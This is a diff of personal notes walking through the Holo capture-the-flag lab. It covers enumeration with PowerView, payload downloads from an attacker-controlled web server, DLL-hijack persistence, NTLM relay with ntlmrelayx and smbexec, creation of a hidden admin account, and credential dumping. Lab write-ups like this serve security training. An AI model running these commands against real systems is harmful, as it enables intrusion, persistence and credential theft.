   StatisticsServer               :
 
-
-
 [*] Completed collection in 7.878 seconds
 ```
-
 
 What CLR version is installed on PC-FILESRV01?
 
@@ -7227,7 +7073,6 @@ What Windows build is PC-FILESRV01 running on?
 OSInfo module
 
 *17763.1577*
-
 
 ### Situational Awareness ALL THE POWER!
 
@@ -7297,7 +7142,6 @@ Read the above and enumerate PC-FILESRV01 using PowerView.
 
  Completed
 
-
 ```
 ┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
 └─$ locate PowerView    
@@ -7350,9 +7194,7 @@ PC-FILESRV01 Storage Replica Administrators      Members of this group have comp
 PC-FILESRV01 System Managed Accounts Group       Members of this group are managed by the system.
 PC-FILESRV01 Users                               Users are prevented from making accidental or intentional system-wi...
 
-
 PS C:\Windows\Tasks> Get-NetLocalGroupMember -Group Administrators
-
 
 ComputerName : PC-FILESRV01
 GroupName    : Administrators
@@ -7369,7 +7211,6 @@ IsGroup      : True
 IsDomain     : True
 
 PS C:\Windows\Tasks> Get-NetLoggedon
-
 
 UserName     : watamet
 LogonDomain  : HOLOLIVE
@@ -7415,9 +7256,7 @@ ComputerName : localhost
 
 GPO stands for "Group Policy Object". It is a collection of settings in Microsoft Windows that define what a system will look like and how it will behave for a defined group of users. GPOs can be used to configure security options, install software, and apply patches, among other tasks. They are typically managed by administrators in a domain-based network and are used to enforce a consistent configuration across multiple computers.
 
-
 PS C:\Windows\Tasks> Get-DomainGPO
-
 
 usncreated               : 5672
 systemflags              : -1946157056
@@ -7468,7 +7307,6 @@ objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,
 PS C:\Windows\Tasks> Find-LocalAdminAccess
 S-SRV01.holo.live
 ```
-
 
 ### Situational Awareness Import-Module PowerUpGreySkull.ps1
 
@@ -7707,7 +7545,6 @@ At line:1 char:32
     + CategoryInfo          : ObjectNotFound: (Get-ADGroup:String) [], CommandNotFoundException
     + FullyQualifiedErrorId : CommandNotFoundException
 
-
 PS C:\Windows\Tasks> Import-Module ActiveDirectory; Get-ADGroupMember
 Import-Module : The specified module 'ActiveDirectory' was not loaded because no valid module file was found in any
 module directory.
@@ -7726,8 +7563,6 @@ At line:1 char:32
     + CategoryInfo          : ObjectNotFound: (Get-ADGroupMember:String) [], CommandNotFoundException
 
 uhmm
-
-
 
 ```
 
@@ -7777,9 +7612,7 @@ Answer the questions below
 ```
 PS C:\Users\watamet> ls
 
-
     Directory: C:\Users\watamet
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -7799,16 +7632,13 @@ d-r---       12/12/2020   1:34 AM                Videos
 PS C:\Users\Administrator> cd C:\Users\watamet\Applications
 PS C:\Users\watamet\Applications> ls
 
-
     Directory: C:\Users\watamet\Applications
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----       12/10/2020  11:34 PM        4870584 kavremover.exe
 
 ```
-
 
 Read the above and exploit the application.
 
@@ -7821,7 +7651,6 @@ What is the name of the vulnerable application found on PC-FILESRV01?
 Submit the root flag from PC-FILESRV01 in Task 4.  
 
  Completed
-
 
 ### Persistence WERE TAKING OVER THIS DLL! Part: II
 
@@ -7897,9 +7726,7 @@ PS C:\Users\watamet\Applications> Invoke-WebRequest http://10.50.74.15:8000/kavr
 
 PS C:\Users\watamet\Applications> ls
 
-
     Directory: C:\Users\watamet\Applications
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -7936,7 +7763,6 @@ MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
 MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
         https://metasploit.com
 
-
        =[ metasploit v6.2.33-dev                          ]
 + -- --=[ 2275 exploits - 1192 auxiliary - 406 post       ]
 + -- --=[ 951 payloads - 45 encoders - 11 nops            ]
@@ -7967,9 +7793,7 @@ PS C:\Users\watamet\Desktop> Invoke-WebRequest http://10.50.74.15:8000/CVE-2021-
 PS C:\Users\watamet\Desktop> cd C:\Users\watamet\Applications\
 PS C:\Users\watamet\Applications> ls
 
-
     Directory: C:\Users\watamet\Applications
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -8059,7 +7883,6 @@ IPv4 Netmask : 255.0.0.0
 IPv6 Address : ::1
 IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
 
-
 Interface  6
 ============
 Name         : AWS PV Network Device #0
@@ -8086,7 +7909,6 @@ User Name          SID
 ================== ==============================================
 pc-filesrv01\adm1n S-1-5-21-4241685735-4112329853-1893400299-1008
 
-
 GROUP INFORMATION
 -----------------
 
@@ -8104,7 +7926,6 @@ NT AUTHORITY\Local account                                    Well-known group S
 LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
 NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                             
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -8136,7 +7957,6 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
 
-
 USER CLAIMS INFORMATION
 -----------------------
 
@@ -8146,8 +7966,6 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
-![[Pasted image 20230206234719.png]]
-
 Read the above and set up persistence on PC-FILESRV01.
 
  Completed
@@ -8155,7 +7973,6 @@ Read the above and set up persistence on PC-FILESRV01.
 What is the first listed vulnerable DLL located in the Windows folder from the application  
 
 *wow64log.dll*
-
 
 ### NTLM Relay Never trust the LanMan
 
@@ -8219,11 +8036,7 @@ Overall, NTLMv2 provides a more secure authentication process compared to NTLMv1
 
 A 16-byte value can be represented in binary form as 128 bits. Each byte consists of 8 bits, so 16 bytes is equal to 128 bits. This representation can be useful for various purposes, such as for encryption, communication protocols, and data storage. When expressing values in binary form, each bit can have a value of either 0 or 1, and the combination of bits can represent a wide range of values and characters.
 
-
 ```
-
-
-![[Pasted image 20230206235913.png]]
 
 Read the above and move on to NTLM exploitation.
 
@@ -8329,7 +8142,6 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.04 seconds
 
-
 ```
 
 Read the above and move on to remotely exploiting NLTM.
@@ -8342,12 +8154,9 @@ nmap -sT -p 445 -A 10.200.x.0/24
 
  Completed
 
-
 What host has SMB signing disabled?
 
 *DC-SRV01*
-
-![[Pasted image 20230207121241.png]]
 
 ### NTLM Relay Why not just turn it off?
 
@@ -8595,8 +8404,6 @@ ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserv
 [*] SOCKS: Adding HOLOLIVE/SRV-ADMIN@10.200.95.30(445) to active SOCKS connection. Enjoy
 [*] SMBD-Thread-21 (process_request_thread): Connection from HOLOLIVE/SRV-ADMIN@127.0.0.1 controlled, but there are no more targets left!
 
-
-
 Finally, while **ntlmrelay** is receiving connections we need to execute **smbexec** obtaining the last flag.
 
 ┌──(kali㉿kali)-[~/Holo]
@@ -8619,10 +8426,8 @@ Dumping credentials
 C:\Windows\system32>net user MyNewUser Password123! /add
 The command completed successfully.
 
-
 C:\Windows\system32>net localgroup Administrators /add MyNewUser
 The command completed successfully.
-
 
 C:\Windows\system32>net user MyNewUser
 User name                    MyNewUser
@@ -8786,10 +8591,7 @@ S-SRV02$:des-cbc-md5:0b5d4032f4158f10
 [*] Cleaning up... 
 [*] Stopping service RemoteRegistry
 
-
 ```
-
-![[Pasted image 20230207122937.png]]
 
 Read the above and weaponize the relay.
 
@@ -8798,7 +8600,6 @@ Read the above and weaponize the relay.
 Submit flags from DC-SRV01 in Task 4.
 
  Completed
-
 
 ### Conclusion End Game
 
@@ -8833,8 +8634,5 @@ Answer the questions below
 Submit the rest of your flags and complete Holo
 
  Completed
-
-![[Pasted image 20230207125447.png]]
-
 
 [[Splunk 3]]
